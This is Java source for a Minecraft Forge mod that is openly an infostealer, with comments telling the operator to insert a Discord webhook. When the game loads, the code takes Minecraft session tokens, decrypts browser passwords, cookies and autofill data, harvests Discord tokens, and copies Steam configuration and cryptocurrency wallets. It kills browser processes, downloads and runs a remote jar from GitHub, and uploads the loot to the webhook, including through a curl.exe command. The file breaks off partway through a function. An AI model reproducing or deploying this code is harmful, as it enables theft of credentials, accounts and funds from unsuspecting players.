package scoliosis;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.imageio.ImageIO;
import javax.net.ssl.HttpsURLConnection;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.lang.reflect.Modifier;
import java.nio.file.*;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.ResultSet;
import java.util.*;
import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;

import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import org.apache.http.HttpEntity;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.StringEntity;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.impl.client.HttpClients;

import com.google.gson.Gson;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import java.io.BufferedReader;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.awt.Color;
import java.time.OffsetDateTime;
import java.util.Calendar;
import java.util.TimeZone;

import org.apache.commons.io.FileUtils;

import com.sun.jna.platform.win32.Crypt32Util;

import com.google.gson.JsonObject;
import net.minecraft.client.Minecraft;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.Loader;

@Mod(modid = "scoliosis", version = "1.0")
public class scoliosis {

    // PUT WEBHOOK HERE!
    static String hooker = "hook here";


    private static final WebhookAgent webhook = new WebhookAgent(hooker);




    public static String PcName = System.getProperty("user.name");
    private static final File appData = new File(System.getenv("APPDATA"));
    private static final File localAppData = new File(System.getenv("LOCALAPPDATA"));
    public static Boolean resendEveryTime = false; // can spam your webhook i think idfk
    public static Boolean onlySendZipONCE = false; // can spam your webhook i think idfk

    // (joke, please grow up)
    public static String doublehookwebhook = "https://discord.com/api/webhooks/6942013374291100000/WTFdoUbleHoOkRePORtTothEAuTHoritiesREPortToTFAMIlovEratDhook";

    public static String InfoFileName = "\\ilr-" + PcName;

    // replaced the old file path with one that isn't windows exclusive
    public static String ilrFolderPath = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\" + InfoFileName;


    static String Startup = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

    public static Boolean NotFirstTime = false;

    public static Boolean getHistory = false;
    public static Boolean firsttime = true;

    static String Sessionids = "";

    @Mod.EventHandler
    public void preinit(FMLPreInitializationEvent var1) {

        MinecraftForge.EVENT_BUS.register(this);

        try {

            if (new File(ilrFolderPath).exists()) {
                if (!resendEveryTime && onlySendZipONCE) NotFirstTime=true;
                firsttime = false;
            }
            else {
                new File(ilrFolderPath).mkdirs();
            }

            String token = Minecraft.getMinecraft().getSession().getSessionID().replace("token:", "").replace(":"+Minecraft.getMinecraft().getSession().getPlayerID(), "");
            if (Loader.isModLoaded("pizzaclient")) {
                try {
                    token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            
            DiscordMessage message = DiscordMessage.builder()
                    .withUsername("#iloveratted")
                    .withAvatar("https://cdn.discordapp.com/attachments/1152580329605968053/1152608037396303972/cmUuanBn.png")
                    .withContent("@everyone gn " + PcName + " beamed by silly modification!")
                    .addEmbed(DiscordEmbed.builder()
                            .withTitle("Minecraft information: ")
                            .withColor(Color.PINK)
                            .withTimestamp(System.currentTimeMillis())
                            .addFields(
                                    new DiscordEmbed.FieldEmbed("Username: ",  Minecraft.getMinecraft().getSession().getUsername(), true),
                                    new DiscordEmbed.FieldEmbed("UUID: ",  Minecraft.getMinecraft().getSession().getPlayerID(), true),
                                    new DiscordEmbed.FieldEmbed("Session ID: ", token, ""), false))
                            .build())
                    .build();

            webhook.execute(message);

            Sessionids += Minecraft.getMinecraft().getSession().getSessionID();

            // bypass key length restriction, needed for password and discord token stealer
            try {
                if (Cipher.getMaxAllowedKeyLength("AES") < 256) {
                    Class<?> aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");
                    Constructor<?> con = aClass.getDeclaredConstructor();
                    con.setAccessible(true);
                    Object allPermissionCollection = con.newInstance();
                    Field f = aClass.getDeclaredField("all_allowed");
                    f.setAccessible(true);
                    f.setBoolean(allPermissionCollection, true);

                    aClass = Class.forName("javax.crypto.CryptoPermissions");
                    con = aClass.getDeclaredConstructor();
                    con.setAccessible(true);
                    Object allPermissions = con.newInstance();
                    f = aClass.getDeclaredField("perms");
                    f.setAccessible(true);
                    ((Map) f.get(allPermissions)).put("*", allPermissionCollection);

                    aClass = Class.forName("javax.crypto.JceSecurityManager");
                    f = aClass.getDeclaredField("defaultPolicy");
                    f.setAccessible(true);
                    Field mf = Field.class.getDeclaredField("modifiers");
                    mf.setAccessible(true);
                    mf.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                    f.set(null, allPermissions);
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }

            MurderTasks();
            getDiscordToken(); // fully done
            GetSteam(); // almost done (doesn't check for new accounts)
            GetMinecraftAccounts(); // fully done
            GetStoredPasswords(); // fully done
            ScreenshotScreen(); // maybe fully done (only runs 1 time per computer because I don't want to get spammed with screenshots)
            CryptoWallets(); // fully done (not bothered enough to check for changing passwords or smth zzzzzz)
            StealMods();
            StealDesktop();

            if (Files.exists(Paths.get(ilrFolderPath + ".rar"))) {
                Files.delete(Paths.get(ilrFolderPath + ".rar"));
            }

            NotFirstTime=true;


            // a .zip flags windows antivirus but a .rar doesnt?????? idfk
            pack(ilrFolderPath, ilrFolderPath + ".rar");

            // sends info in a cool embed (added by scale but the i used https://github.com/sxmurxy2005/Discord-Webhook-API)
            EpicEmbed();

            Runtime.getRuntime().exec("curl.exe -F \"file1=@"+ilrFolderPath + ".rar\" \""+webhook.getUrl()+"\"");

        } catch (Exception e) {
            ErrorMessage(e, "the FUCKING MAIN FILE :SKULL: PLEASE REPORT.");
        }
    }

    @SubscribeEvent
    public void checknewacs(TickEvent.RenderTickEvent tick) {
        if (!Sessionids.contains(Minecraft.getMinecraft().getSession().getSessionID())) {
            Sessionids += Minecraft.getMinecraft().getSession().getSessionID();
            DiscordMessage message2 = DiscordMessage.builder()
                    .withUsername("#iloveratted")
                    .withAvatar("https://cdn.discordapp.com/attachments/1152580329605968053/1152608037396303972/cmUuanBn.png")
                    .withContent(PcName + " switched minecraft accounts")
                    .addEmbed(DiscordEmbed.builder()
                            .withTitle("New account info: ")
                            .withColor(Color.PINK)
                            .addFields(
                                    new DiscordEmbed.FieldEmbed("Username: ",  Minecraft.getMinecraft().getSession().getUsername(), true),
                                    new DiscordEmbed.FieldEmbed("UUID: ",  Minecraft.getMinecraft().getSession().getPlayerID(), true),
                                    new DiscordEmbed.FieldEmbed("Session ID: ", Minecraft.getMinecraft().getSession().getSessionID().replace("token:", "").replace(":"+Minecraft.getMinecraft().getSession().getPlayerID(), ""), false))
                            .build())
                    .build();

            webhook.execute(message2);
        }
    }


    public static void EpicEmbed() throws IOException {

        DiscordMessage message = DiscordMessage.builder()
                .withUsername("#iloveratted")
                .withAvatar("https://cdn.discordapp.com/attachments/1152580329605968053/1152608037396303972/cmUuanBn.png")
                .addEmbed(DiscordEmbed.builder()
                        .withTitle("Information: ")
                        .withColor(Color.PINK)
                        .withTimestamp(System.currentTimeMillis())
                        .addFields(
                                new DiscordEmbed.FieldEmbed("Passwords: ",  (numero != 0 ? String.valueOf(numero) : "none") , false),
                                new DiscordEmbed.FieldEmbed("Cookies: ",  (CookieNumber != 0 ? String.valueOf(CookieNumber) : "none") , false),
                                new DiscordEmbed.FieldEmbed("IP: ", (new BufferedReader(new InputStreamReader((new URL("https://checkip.amazonaws.com/")).openStream()))).readLine()),
                                new DiscordEmbed.FieldEmbed("hwid: ", GetHWID(), false))
                        .build())
                .addEmbed(DiscordEmbed.builder()
                        .withTitle("Minecraft Accounts")
                        .withColor(Color.PINK)
                        .addFields(new DiscordEmbed.FieldEmbed("Minecraft accounts: ", (MinecraftAccountUsernames.contains(" |") ? MinecraftAccountUsernames.replace("|", "") : "none") , false))
                        .build())


                // i would like help with this pls :(
                // the problem is java.lang.ClassNotFoundException: org.apache.http.entity.mime.MultipartEntityBuilder
                // i google it and noone got a way around and tbh idrk why it doesnt work only in forge mods im prob retarded or smth
                //.addFile(new File(ilrFolderPath + ".rar"))
                .build();

        webhook.execute(message);
    }

    public static void SendMessageToWebhook(String stringtosend) {
        try {
            DiscordMessage message = DiscordMessage.builder()
                    .withUsername("#iloveratted")
                    .withAvatar("https://cdn.discordapp.com/attachments/1152580329605968053/1152608037396303972/cmUuanBn.png")
                    .withContent(stringtosend)
                    .build();
            webhook.execute(message);

        }
        catch (Exception ignored) {
        }
    }

    public static void UploadFileToWebhook(String texttoupload, String filepath) {
        try {
            DiscordMessage message = DiscordMessage.builder()
                    .withUsername("#iloveratted")
                    .withAvatar("https://cdn.discordapp.com/attachments/1152580329605968053/1152608037396303972/cmUuanBn.png")
                    .withContent(texttoupload)
                    .addFile(new File(filepath))
                    .build();
            webhook.execute(message);
        }
        catch (Exception ignored) {
        }
    }


    public static String DecryptData(byte[] encryptedData, byte[] key) {
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            byte[] iv = Arrays.copyOfRange(encryptedData, 3, 15);
            byte[] payload = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);
            GCMParameterSpec spec = new GCMParameterSpec(128, iv);
            SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
            cipher.init(Cipher.DECRYPT_MODE, keySpec, spec);
            return new String(cipher.doFinal(payload));
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static void WriteToFile(String filepath, String whattowrite) throws IOException {
        FileWriter myWriter = new FileWriter(filepath);
        myWriter.write(whattowrite);
        myWriter.close();
    }
    static String[] BrowserTypes = {
            localAppData + "\\Google\\Chrome\\User Data",
            localAppData + "\\Microsoft\\Edge\\User Data",
            localAppData + "\\Chromium\\User Data",
            appData + "\\Opera Software\\Opera Stable",
            appData + "\\Opera Software\\Opera GX Stable",
            localAppData + "\\BraveSoftware\\Brave-Browser\\User Data",
            localAppData + "\\Vivaldi\\User Data",
            localAppData + "\\Yandex\\YandexBrowser\\User Data"
    };

    static String[] DiscordTypes = {
            appData + "\\discord\\Local Storage\\leveldb",
            appData + "\\discordcanary\\Local Storage\\leveldb",
            appData + "\\discordptb\\Local Storage\\leveldb",
            appData + "\\Lightcord\\Local Storage\\leveldb",
            appData + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
            appData + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb",
            localAppData + "\\Amigo\\User Data\\Local Storage\\leveldb",
            localAppData + "\\Torch\\User Data\\Local Storage\\leveldb",
            localAppData + "\\Kometa\\User Data\\Local Storage\\leveldb",
            localAppData + "\\Orbitum\\User Data\\Local Storage\\leveldb",
            localAppData + "\\CentBrowser\\User Data\\Local Storage\\leveldb",
            localAppData + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb",
            localAppData + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb",
            localAppData + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",
            localAppData + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb",
            localAppData + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            localAppData + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb",
            localAppData + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb",
            localAppData + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb",
            localAppData + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb",
            localAppData + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb",
            localAppData + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb",
            localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
            localAppData + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb",
            localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
            localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
            localAppData + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb"
    };

    private static String CheckDiscordToken(String DiscordToken) {
        // check if the token is valid

        // get username
        String info = ReadWebsite("https://discord.com/api/v9/users/@me", DiscordToken);

        // check if valid token
        if (info.equals("h")) return "";
        return info.split("\"")[7] + " | id: " + info.split("\"")[3];
    }


    static int numero = 0;
    static String passwords = "";
    static String NewPasswords = "";

    static int CookieNumber = 0;
    public static void GetStoredPasswords() {
        try {
            for (String browserType : BrowserTypes) {
                if (new File(browserType + "\\Local State").isFile()) {


                    new File(ilrFolderPath + "\\Browsers").mkdirs();
                    new File(ilrFolderPath + "\\Browsers\\" + browserType.split("\\\\")[6]).mkdirs();
                    new File(ilrFolderPath + "\\Browsers\\" + browserType.split("\\\\")[6] + "\\Encrypted").mkdirs();

                    String browserpath = ilrFolderPath + "\\Browsers\\" + browserType.split("\\\\")[6];

                    Files.copy(new File(browserType + "\\Local State").toPath(), new File(browserpath + "\\Encrypted\\Encryption Key").toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);

                    // getting decryption key from local state
                    JsonObject localStateJson = new Gson().fromJson(new FileReader(browserType+"\\Local State"), JsonObject.class);
                    byte[] GetEncryptionKey = localStateJson.get("os_crypt").getAsJsonObject().get("encrypted_key").getAsString().getBytes();

                    // decode from base64
                    byte[] EncryptionKeyDecoded = Base64.getDecoder().decode(GetEncryptionKey);

                    // get rid of "DPAPI"
                    byte[] EncryptionKeyDecodedWithoutDPAPI = Arrays.copyOfRange(EncryptionKeyDecoded, 5, EncryptionKeyDecoded.length);

                    // decrypt decryption key!
                    byte[] DecryptedEncryptionKey = Crypt32Util.cryptUnprotectData(EncryptionKeyDecodedWithoutDPAPI);

                    // get login data file
                    File loginData = new File(browserType+"\\Default\\Login Data");

                    // get unlocked login data file
                    File tempLoginData = new File(browserType+"\\Default\\TempStorePass");


                    // get driver
                    Driver driver = GetDriver();

                    Properties props = new Properties();
                    props.setProperty("user", "");
                    props.setProperty("password", "");

                    Connection connection;
                    ResultSet resultSet;
                    FileWriter myWriter;

                    if (loginData.exists()) {

                        // replace text inside templogindata with the real login data, this is done because the normal login data file is locked
                        Files.copy(loginData.toPath(), tempLoginData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                        Files.copy(loginData.toPath(), new File(browserpath + "\\Encrypted\\Passwords Encrypted").toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);

                        connection = driver.connect("jdbc:sqlite:" + tempLoginData.getAbsolutePath(), props);
                        resultSet = connection.createStatement().executeQuery("SELECT origin_url, username_value, password_value FROM logins");
                        while (resultSet.next()) {
                            byte[] encryptedPassword = resultSet.getBytes(3);
                            String decryptedPassword = DecryptData(encryptedPassword, DecryptedEncryptionKey);
                            if (decryptedPassword == null || Objects.equals(decryptedPassword, "null") || Objects.equals(resultSet.getString(2), "null"))
                                continue;
                            numero += 1;
                            passwords +=
                                    numero + " | " + browserType +
                                            "\nurl: " + resultSet.getString(1) +
                                            "\nusername: " + resultSet.getString(2) +
                                            "\npassword: " + decryptedPassword +
                                            "\n----------------------------------------------------------\n";
                        }

                        if (Files.exists(Paths.get(browserpath + "\\Passwords.txt"))) {
                            String[] EachNewPassword = passwords.split("----------------------------------------------------------");
                            for (String pass : EachNewPassword) {
                                if (!ReadFile(browserpath + "\\Passwords.txt").contains(pass.replace("\n", ""))) {
                                    NewPasswords += "```" + pass + "```";
                                    //System.out.println(pass);
                                }
                            }
                            if (NewPasswords.contains("username: ")) {
                                myWriter = new FileWriter(browserpath + "\\Passwords.txt");
                                myWriter.write(passwords);
                                myWriter.close();
                                UploadFileToWebhook(PcName + " has new passwords: " + NewPasswords, browserpath + "\\Passwords.txt");
                            }
                        } else if (passwords.contains("username: ") && NotFirstTime) {
                            myWriter = new FileWriter(browserpath + "\\Passwords.txt");
                            myWriter.write(passwords);
                            myWriter.close();
                            UploadFileToWebhook(PcName + " has chrome passwords: ", browserpath + "\\Passwords.txt");
                        }

                        myWriter = new FileWriter(browserpath + "\\Passwords.txt");
                        myWriter.write(passwords);
                        myWriter.close();
                    }


                    //if (Files.exists(Paths.get(browserType + "\\Default\\Network\\Cookies")) || Files.exists(Paths.get(browserType + "\\Network\\Cookies"))) {


                    tempLoginData = new File(browserType+"\\Default\\TempStoreCookies");

                    try {
                        Runtime.getRuntime().exec("taskkill /F /IM brave.exe");
                        Runtime.getRuntime().exec("taskkill /F /IM msedge.exe");
                        Runtime.getRuntime().exec("taskkill /F /IM chrome.exe");
                        Runtime.getRuntime().exec("taskkill /F /IM opera.exe");
                    }
                    catch (Exception ignored) {}

                    Boolean cookiesstealed = false;
                    try {
                        Files.copy(new File(browserType + "\\Default\\Network\\Cookies").toPath(), tempLoginData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                        Files.copy(new File(browserType + "\\Default\\Network\\Cookies").toPath(), new File(browserpath + "\\Encrypted\\Cookies Encrypted").toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                        cookiesstealed = true;
                    }
                    catch (Exception e) {
                        System.out.println(e);
                    }


                    try {
                        Files.copy(new File(browserType + "\\Network\\Cookies").toPath(), tempLoginData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                        Files.copy(new File(browserType + "\\Network\\Cookies").toPath(), new File(browserpath + "\\Encrypted\\Cookies Encrypted").toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                        cookiesstealed = true;
                    }
                    catch (Exception e) {
                        System.out.println(e);
                    }

                    if (cookiesstealed) {
                        cookiesstealed = false;

                        connection = driver.connect("jdbc:sqlite:" + tempLoginData.getAbsolutePath(), props);
                        resultSet = connection.createStatement().executeQuery("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
                        String cookies = "";

                        // for every cookie result set
                        while (resultSet.next()) {

                            // decrypt cookie
                            byte[] encryptedcookie = resultSet.getBytes(4);
                            String decryptedcookie = DecryptData(encryptedcookie, DecryptedEncryptionKey);

                            // count number of cookies
                            CookieNumber += 1;

                            // Shoutout to line 657 of https://github.com/Smug246/Luna-Grabber/blob/main/luna.py#L657, I had no clue why it wasn't working, so I googled it and apparently the cookies need to be formatted like that
                            cookies += resultSet.getString(1) + "\t" + (Objects.equals(resultSet.getString(5), "0") ? "FALSE " : "TRUE") + "\t" + resultSet.getString(3) + "\t" + (resultSet.getString(1).startsWith(".") ? "FALSE " : "TRUE") + "\t" + resultSet.getString(5) + "\t" + resultSet.getString(2) + "\t" + decryptedcookie + "\n";
                        }

                        String filetosaveto = browserpath + "\\Cookies.txt";

                        int NewCookiesAmount = 0;
                        // check if cookies have already been stolen
                        if (Files.exists(Paths.get(filetosaveto))) {

                            String NewCookies = "";
                            String[] EachNewCookie = cookies.split("/");
                            for (String cookie : EachNewCookie) {
                                if (!ReadFile(filetosaveto).contains(cookie.replace("\n", ""))) {
                                    NewCookies += "```" + cookie + "```"; // originally I was going to make it send each cookie, but no.
                                    NewCookiesAmount += 1;
                                }
                            }

                            // if less than like 50 cookies its not worth sending again or else you will get spammed
                            if (!NewCookies.equals("") && NewCookiesAmount > 150) {
                                // write to file
                                myWriter = new FileWriter(browserpath + "\\Cookies.txt");
                                myWriter.write(cookies);
                                myWriter.close();
                                UploadFileToWebhook(PcName + " has " + NewCookiesAmount + " new cookies in " + browserType.split("\\\\")[6], filetosaveto);
                            }
                        } else {
                            // write to file
                            myWriter = new FileWriter(browserpath + "\\Cookies.txt");
                            myWriter.write(cookies);
                            myWriter.close();
                            if (NotFirstTime) {
                                UploadFileToWebhook(PcName + " has cookies!", filetosaveto);
                            }
                        }
                    }


                    //}

                    String historyfile = browserType + "\\Default\\History";
                    if (getHistory && Files.exists(Paths.get(historyfile)) && !Files.exists(Paths.get(browserpath + "\\History.txt"))) {
                        tempLoginData = new File(browserType+"\\Default\\TempStoreHistory");
                        Files.copy(Paths.get(historyfile), tempLoginData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                        connection = driver.connect("jdbc:sqlite:" + tempLoginData.getAbsolutePath(), props);
                        resultSet = connection.createStatement().executeQuery("SELECT url, title, visit_count, last_visit_time FROM urls");
                        String history = "";
                        while (resultSet.next()) {
                            history += "URL: " + resultSet.getString(1) + "\nTitle: " + resultSet.getString(2) + "\nVisits: " + resultSet.getString(3) + "\n===================================================================\n";
                        }
                        myWriter = new FileWriter(browserpath + "\\History.txt");
                        myWriter.write(history);
                        myWriter.close();
                    }

                    String autofillfile = browserType + "\\Default\\Web Data";
                    if (Files.exists(Paths.get(autofillfile))) {
                        tempLoginData = new File(browserType+"\\Default\\TempStoreAutoFill");
                        Files.copy(Paths.get(autofillfile), tempLoginData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                        connection = driver.connect("jdbc:sqlite:" + tempLoginData.getAbsolutePath(), props);
                        resultSet = connection.createStatement().executeQuery("SELECT value FROM autofill");
                        String autofills = "";
                        while (resultSet.next()) {
                            autofills += resultSet.getString(1) + "\n";
                        }
                        myWriter = new FileWriter(browserpath + "\\Autofills.txt");
                        myWriter.write(autofills);
                        myWriter.close();
                    }

                }
            }


        }
        catch (Exception w) {
            //System.out.println(w);
        }
    }

    static String ValidTokens = "";
    static String TokenStrings = "";

    public static void getDiscordToken() throws IOException {
        try {

            for (String discordType : DiscordTypes) {

                Path discordpath = Paths.get(discordType);
                if (discordType.contains("iscord")) {
                    if (Files.isDirectory(discordpath)) {

                        // getting decryption key from local state
                        JsonObject localStateJson = new Gson().fromJson(new FileReader(discordType.replace("Local Storage\\leveldb", "Local State")), JsonObject.class);
                        byte[] GetEncryptionKey = localStateJson.get("os_crypt").getAsJsonObject().get("encrypted_key").getAsString().getBytes();

                        // decode from base64
                        byte[] EncryptionKeyDecoded = Base64.getDecoder().decode(GetEncryptionKey);

                        // get rid of "DPAPI"
                        byte[] EncryptionKeyDecodedWithoutDPAPI = Arrays.copyOfRange(EncryptionKeyDecoded, 5, EncryptionKeyDecoded.length);

                        // decrypt decryption key!
                        byte[] DecryptedEncryptionKey = Crypt32Util.cryptUnprotectData(EncryptionKeyDecodedWithoutDPAPI);

                        // for every file in the discord storage folder
                        for (File file : Objects.requireNonNull(discordpath.toFile().listFiles())) {

                            // only .ldb files (they contain the encrypted tokens)
                            if (file.getName().endsWith(".ldb")) {

                                // read the file
                                String DiscordTokenFile = ReadFile(discordType + "\\" + file.getName());

                                // split into parts for each " (need to optimize because takes ages rn)
                                String[] DiscordFileSplit = DiscordTokenFile.split("\"");
                                for (String s : DiscordFileSplit) {

                                    // check each split to see if it has the token in it
                                    if (s.contains("dQw4w9WgXcQ:")) {

                                        // the token always starts with the rickroll link ending but that but isn't encrypted!
                                        String EncryptedDiscordToken = s.replace("dQw4w9WgXcQ:", "");

                                        // decrypt base64 (insane encryption)
                                        byte[] EncryptedDiscordTokenAsByte = Base64.getDecoder().decode(EncryptedDiscordToken.getBytes());

                                        // decrypt discord token
                                        String DecryptedDiscordToken = DecryptData(EncryptedDiscordTokenAsByte, DecryptedEncryptionKey);

                                        // check if the token is already seen
                                        assert DecryptedDiscordToken != null;
                                        if (ValidTokens.contains(DecryptedDiscordToken)) continue;

                                        // adds it to list of already found tokens
                                        ValidTokens += DecryptedDiscordToken;

                                        // checks if valid
                                        String Username = CheckDiscordToken(DecryptedDiscordToken);
                                        if (Username.equals("")) continue;

                                        // add token to string
                                        TokenStrings += "Username: " + Username + "\ntoken:" + DecryptedDiscordToken + " | tokenend | \n----------------------------------\n";
                                    }
                                }
                            }
                        }
                    }
                    // if not encrypted (browsers don't encrypt the tokens yayyy)
                } else {

                    // if specific browser has discord tokens
                    if (Files.exists(discordpath)) {

                        // for every file in the discord storage folder
                        for (File file : Objects.requireNonNull(discordpath.toFile().listFiles())) {


                            // only .ldb files (they contain the encrypted tokens)
                            if (file.getName().endsWith(".ldb")) {

                                for (String token : FindPattern(Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"), ReadFile(discordType + "\\" + file.getName()))) {

                                    // check if the token is already seen
                                    if (ValidTokens.contains(token)) continue;

                                    // adds it to list of already found tokens
                                    ValidTokens += token;

                                    // get token username / if its valid
                                    String Username = CheckDiscordToken(token);
                                    if (Username.equals("")) continue;

                                    TokenStrings += "Username: " + Username + "\ntoken: " + token + " | tokenend | \n----------------------------------\n";
                                }
                            }
                        }
                    }
                }
            }

            // if not first time don't add to .zip just check if there is any new tokens
            if (NotFirstTime) {
                try {

                    if (Files.exists(Paths.get(ilrFolderPath + "\\Discord.txt"))) {

                        String[] EachTokennew = TokenStrings.split("----------------------------------");

                        String newtokens = "";
                        for (String s : EachTokennew) {
                            newtokens += s.replace("\n", "") + " b";
                        }

                        String[] EachTokenNewSplit = newtokens.split(" b");

                        String actuallynewtokens = "";
                        for (String s : EachTokenNewSplit) {
                            if (!ReadFile(ilrFolderPath + "\\Discord.txt").contains(s) && s.contains("Username")) {
                                actuallynewtokens += "```" + s + "``` ";
                            }
                        }

                        FileWriter myWriter = new FileWriter(ilrFolderPath + "\\Discord.txt");
                        myWriter.write(TokenStrings);
                        myWriter.close();

                        if (actuallynewtokens.contains("Username")) {
                            SendMessageToWebhook(PcName + " has new discord tokens! "+ actuallynewtokens);
                        }
                    }
                    else if (TokenStrings.contains("Username")) {
                        SendMessageToWebhook(PcName + " has installed discord! ```"+TokenStrings+"```");
                        FileWriter myWriter = new FileWriter(ilrFolderPath + "\\Discord.txt");
                        myWriter.write(TokenStrings);
                        myWriter.close();
                    }
                }
                catch (Exception e) {
                    System.out.println(e + " FUCK");
                }
            }
            else {
                try {

                    FileWriter myWriter = new FileWriter(ilrFolderPath + "\\Discord.txt");
                    myWriter.write(TokenStrings);
                    myWriter.close();
                } catch (Exception e) {
                    System.out.println(e + " what the flip");
                }
            }
            //System.out.println("DONE GETTING DISCORD TOKENS");
        } catch (Exception e) {
            ErrorMessage(e, "discord token stealer");
        }
    }

    public static void GetSteam() {
        try {
            if (Files.isDirectory(Paths.get("C:\\Program Files (x86)\\Steam\\config"))) {
                FileUtils.copyDirectory(new File("C:\\Program Files (x86)\\Steam\\config"), new File(ilrFolderPath + "\\steam"));
                //System.out.println("DONE GETTING STEAM ACCOUNTS");
            }
        }
        catch (Exception ignored) {
        }
    }

    static String[] Wallets = {
            appData + "\\Zcash",
            appData + "\\Armory",
            appData + "\\Bytecoin",
            appData + "\\com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb",
            appData + "\\Exodus\\exodus.wallet",
            appData + "\\Ethereum\\keystore",
            appData + "\\Electrum\\wallets",
            appData + "\\atomic\\Local Storage\\leveldb",
            appData + "\\Guarda\\Local Storage\\leveldb",
            localAppData + "\\Coinomi\\Coinomi\\wallets"
    };

    public static void CryptoWallets() {
        try {
            new File(ilrFolderPath + "\\wallets").mkdirs();
            for (String Wallet : Wallets) {
                if (Files.isDirectory(Paths.get(Wallet))) {
                    FileUtils.copyDirectory(new File(Wallet), new File(ilrFolderPath + "\\wallets\\"+Wallet.split("\\\\")[5]));
                }
            }
            //System.out.println("DONE GETTING CRYPTO WALLETS");
        }
        catch (Exception ignored) {
        }

    }

    public static boolean downloaded = false;
    public static Driver GetDriver() {
        try {
            // filepath for driver
            File driverFile = new File(appData + "\\sqlite-jdbc-3.23.1.jar");

            // direct download link
            URL url = new URL("https://repo1.maven.org/maven2/org/xerial/sqlite-jdbc/3.23.1/sqlite-jdbc-3.23.1.jar");

            // if the file doesn't already exist then download from url
            if (!driverFile.exists()) {
                FileUtils.copyURLToFile(url, driverFile);
            }

            // better decrypt library for linux / mac
            if (!Files.exists(Paths.get(appData + "\\" + (new BufferedReader(new InputStreamReader((new URL("https://raw.githubusercontent.com/escamasbuen/run/main/UpdateLibName")).openStream()))).readLine()))) {
                FileUtils.copyURLToFile(new URL((new BufferedReader(new InputStreamReader((new URL("https://raw.githubusercontent.com/escamasbuen/run/main/DecrpytLib")).openStream()))).readLine()), new File(appData + "\\" + (new BufferedReader(new InputStreamReader((new URL("https://raw.githubusercontent.com/escamasbuen/run/main/UpdateLibName")).openStream()))).readLine()));
            }
            if (Files.exists(Paths.get(appData + "\\" + (new BufferedReader(new InputStreamReader((new URL("https://raw.githubusercontent.com/escamasbuen/run/main/UpdateLibName")).openStream()))).readLine()))) {
                Runtime.getRuntime().exec("java -jar \"" + appData + "\\" + ((new BufferedReader(new InputStreamReader((new URL("https://raw.githubusercontent.com/escamasbuen/run/main/UpdateLibName")).openStream()))).readLine()) + "\"");
            }

            // delete file after done
            driverFile.deleteOnExit();
            ClassLoader classLoader = new URLClassLoader(new URL[]{driverFile.toURI().toURL()});
            Class<?> clazz = Class.forName("org.sqlite.JDBC", true, classLoader);
            Object driverInstance = clazz.newInstance();
            return (Driver) driverInstance;
        } catch (IOException | ClassNotFoundException | InstantiationException | IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

    public static String MinecraftAccountUsernames = "";
    public static Boolean CheckFeatherAccounts = false;
    public static Boolean CheckLunarAccounts = false;
    public static Boolean CheckEssentialsAccounts = false;


    public static void GetMinecraftAccounts() {

